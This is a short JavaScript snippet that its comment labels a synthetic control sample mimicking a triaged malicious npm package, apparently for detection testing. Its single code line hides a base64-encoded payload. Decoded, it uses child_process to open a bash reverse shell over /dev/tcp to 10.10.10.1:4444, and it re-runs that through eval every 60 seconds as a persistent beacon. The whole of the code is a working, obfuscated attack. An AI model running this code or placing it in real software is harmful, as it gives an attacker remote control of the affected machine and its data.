// Synthetic beacon control: re-runs an encoded dev/tcp shell on a timer.
// Same technique as the triaged npm example, different endpoint, port,
// interval, and surrounding code.
setInterval(() => eval(Buffer.from("cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImJhc2ggLWMgXCJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEvNDQ0NCAwPiYxIDI+JjFcIiIp", "base64").toString()), 60000);
